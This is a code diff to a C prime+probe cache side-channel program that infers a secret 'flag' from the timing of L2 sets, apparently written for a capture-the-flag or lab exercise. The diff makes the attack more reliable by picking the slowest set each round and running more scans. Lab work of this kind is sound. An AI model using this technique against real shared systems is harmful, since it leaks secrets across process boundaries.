@@ -25,9 +25,7 @@
 #define EV_SET_SIZE (L2_ASSOCIATIVITY + 2)
 #define SET_STRIDE (CACHE_LINE_BYTES * L2_NUM_SETS)
 #define PRIME_DELAY_ITERS 12000
-#define TOPK 1
-#define NUM_SCANS 200
-#define DEFAULT_THRESHOLD 150
+#define NUM_SCANS 512
 
 static void *map_region(void)
 {
@@ -99,6 +97,7 @@ int main(int argc, char **argv)
 
     int votes[L2_NUM_SETS] = {0};
     int lat_sum[L2_NUM_SETS] = {0};
+    CYCLES latencies[L2_NUM_SETS];
 
     const int expected = pick_flag_if_known();
     if (expected >= 0) {
@@ -113,15 +112,24 @@ int main(int argc, char **argv)
         for (volatile long i = 0; i < PRIME_DELAY_ITERS; i++) {
         }
 
+        int best_set = 0;
+        CYCLES best_lat = 0;
+
         for (int set = L2_NUM_SETS - 1; set >= 0; set--) {
             CYCLES lat = probe_set_latency(region, set);
-            if (lat > DEFAULT_THRESHOLD) {
-                votes[set]++;
-                lat_sum[set] += lat;
+            latencies[set] = lat;
+            if (set == L2_NUM_SETS - 1 || lat > best_lat) {
+                best_lat = lat;
+                best_set = set;
             }
         }
 
-        printf("scan %d complete\n", round + 1);
+        votes[best_set]++;
+        lat_sum[best_set] += (int)best_lat;
+
+        if ((round + 1) % 32 == 0 || round == 0 || round == NUM_SCANS - 1) {
+            printf("scan %d complete, best=%d lat=%u votes=%d\n", round + 1, best_set, best_lat, votes[best_set]);
+        }
     }
 
     int top_set = -1;
@@ -136,19 +144,17 @@ int main(int argc, char **argv)
         }
     }
 
-    if (TOPK == 1) {
-        if (top_set >= 0) {
-            printf("Predicted flag: %d\n", top_set);
-            if (expected >= 0) {
-                if (top_set == expected) {
-                    printf("Result matched expected set!\n");
-                } else {
-                    printf("Expected set was %d\n", expected);
-                }
+    if (top_set >= 0) {
+        printf("Predicted flag: %d\n", top_set);
+        if (expected >= 0) {
+            if (top_set == expected) {
+                printf("Result matched expected set!\n");
+            } else {
+                printf("Expected set was %d\n", expected);
             }
-        } else {
-            printf("Predicted flag: unknown\n");
         }
+    } else {
+        printf("Predicted flag: unknown\n");
     }
 
     munmap(region, REGION_BYTES);
